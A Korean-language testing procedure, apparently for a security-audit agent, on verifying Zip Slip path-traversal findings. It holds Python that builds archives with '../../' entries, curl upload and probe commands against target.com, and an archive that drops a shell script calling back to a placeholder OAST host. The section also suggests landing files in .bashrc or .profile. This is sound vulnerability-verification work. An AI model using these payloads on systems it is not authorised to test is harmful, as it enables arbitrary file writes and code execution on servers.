### Phase 2: 동적 테스트 (검증)

Phase 1 소스코드 분석이 완료되면 후보 목록을 사용자에게 보여준다. 후보가 존재하는 경우에만 동적 테스트를 진행한다. 후보가 0건이면 동적 테스트 없이 바로 보고서를 작성한다.

**동적 테스트 정보 획득:**

사용자에게는 테스트 대상 도메인(Host)과 직접 획득이 불가능한 정보(외부 콜백 서비스 URL, 프로덕션 전용 자격 증명 등)만 요청한다. 그 외의 정보는 소스코드 분석 또는 관련 엔드포인트에 직접 HTTP 요청을 보내 획득한다.

사용자가 동적 테스트를 원하지 않거나 정보를 제공하지 않으면, 소스코드 분석 결과의 모든 후보를 "후보"로 유지한 채 Phase 3으로 진행한다.

**테스트용 Zip Slip 파일 생성:**
```python
# 무해한 Zip Slip 테스트 파일 생성 (Python)
import zipfile
import io

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # 웹 루트 방향으로 향하는 엔트리 (고유 파일명으로 기존 파일 충돌 방지)
    import time
    unique_name = f'zipslip-verify-{int(time.time())}.txt'
    zf.writestr(f'../../public/{unique_name}', 'ZIPSLIP_TEST_MARKER')
    # 정상 엔트리도 포함 (비교용)
    zf.writestr('normal.txt', 'normal file')
buf.seek(0)
with open('zipslip-test.zip', 'wb') as f:
    f.write(buf.read())
```

**검증 전략:**

Zip Slip은 서버 내부에서 파일이 생성되므로 외부에서 결과를 확인하기 어렵다. 다음 방법들을 병행하고, **하나라도 파일 생성/실행이 확인되면 "확인됨"**으로 판정한다.

**방법 1: 웹 접근 가능 경로로 검증 (가장 확실)**
소스코드에서 압축 해제 대상 디렉토리와 웹 루트의 상대 경로를 파악한 뒤, 웹 루트(`public/`, `static/`, `uploads/`)로 향하는 경로를 가진 테스트 ZIP을 생성한다.

```
# 1. 테스트 ZIP 업로드
curl -X POST "https://target.com/api/upload" \
  -H "Cookie: session=..." \
  -F "file=@zipslip-test.zip"

# 2. 웹 루트에 파일이 생성되었는지 URL로 접근하여 확인
# 파일명은 타임스탬프 기반 고유명을 사용하여 기존 파일과 충돌 방지
curl "https://target.com/zipslip-verify-1753350000.txt"
# 응답이 "ZIPSLIP_TEST_MARKER"이면 → Zip Slip 확인됨
# 404이면 → 파일 미생성 (방어됨 또는 경로 불일치)
```

**방법 2: 서버 응답 기반 추론**
파일이 웹 접근 불가 위치에 생성되는 경우, 서버 응답을 분석한다.

```
# 테스트 ZIP 업로드 후 응답 분석
curl -X POST "https://target.com/api/upload" -F "file=@zipslip-test.zip" -v

# 취약한 경우:
# - 200 OK + "2 files extracted" (../가 포함된 엔트리도 정상 처리)
# - 에러 없이 모든 엔트리 해제 완료

# 안전한 경우:
# - 400/500 에러 + "path traversal", "invalid path", "security" 등 에러 메시지
# - "1 file extracted" (../가 포함된 엔트리는 건너뜀)
# - 정상 엔트리만 해제되고 ../는 거부
```

**방법 3: OAST 콜백을 통한 검증**
사용자에게 OAST(Out-of-band Application Security Testing) URL을 요청하여 (interactsh, Burp Collaborator 등), 파일 생성 시 외부 콜백이 발생하도록 한다. Linux 서버에서 `.bashrc`나 `.profile`에 파일이 생성되면 셸 로그인 시 자동으로 콜백이 실행된다.

```python
# OAST 콜백을 포함한 Zip Slip 테스트 파일 생성
import zipfile, io, time

oast_url = "OAST_URL_HERE"  # 사용자 제공 OAST URL
unique_id = int(time.time())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # /tmp에 무해한 마커 파일 생성 (직접 확인용)
    zf.writestr(f'../../tmp/zipslip-verify-{unique_id}.txt', 'ZIPSLIP_TEST_MARKER')
    # OAST 콜백 파일 — 셸 실행 시 curl로 콜백 전송
    zf.writestr(f'../../tmp/.zipslip-oast-{unique_id}.sh',
        f'#!/bin/sh\ncurl -s "{oast_url}/zipslip-{unique_id}" >/dev/null 2>&1 &\n')
buf.seek(0)
with open('zipslip-oast-test.zip', 'wb') as f:
    f.write(buf.read())
```

OAST 서비스에서 콜백 수신이 확인되면 파일 생성 + 실행이 증명된다. 콜백이 오지 않아도 파일 자체는 생성되었을 수 있으므로 방법 1, 2와 병행한다.

**방법 4: 소스코드 분석 + 응답 종합 판단**
서버 응답만으로는 확정이 어려운 경우, 소스코드에서 확인한 경로 검증 미흡 + 에러 없는 응답을 종합하여 판단한다. 이 경우 "후보"로 보고하되, 사용자에게 서버 파일 시스템 직접 확인을 안내한다.

**최종 판정 기준:**

| 방법 1 (웹 접근) | 방법 2 (응답 분석) | 방법 3 (OAST) | 판정 |
|---|---|---|---|
| 파일 확인됨 | - | - | **확인됨** |
| - | - | 콜백 수신됨 | **확인됨** |
| 404 | 에러 없이 처리 | 콜백 없음 | **후보** (파일 생성 추정, 웹 접근 불가 위치) |
| 404 | 에러 반환 | 콜백 없음 | **보고서 제외** (방어됨) |
| - | 에러 없이 처리 | - | **후보** (방법 1 또는 3 병행 권장) |

- **확인됨**: 방법 1에서 웹 접근으로 파일이 확인되거나, 방법 3에서 OAST 콜백이 수신됨
- **후보**: 소스코드상 경로 검증이 없고 서버가 에러 없이 처리하지만, 파일 생성을 외부에서 직접 확인하지 못한 경우. 사용자에게 서버 파일 시스템 직접 확인 방법을 안내한다.
- **"확인됨"은 동적 테스트를 통해서만 부여할 수 있다**: 소스코드 분석만으로는 아무리 취약해 보여도 "확인됨"으로 보고하지 않는다. 동적 테스트로 실제 트리거를 확인한 경우에만 "확인됨"이다. 동적 테스트를 수행하지 않았으면 모든 결과는 "후보"이다.
- **보고서 제외**: 서버가 `../` 엔트리에 대해 에러를 반환하거나, 소스코드에서 경로 검증이 확인된 경우
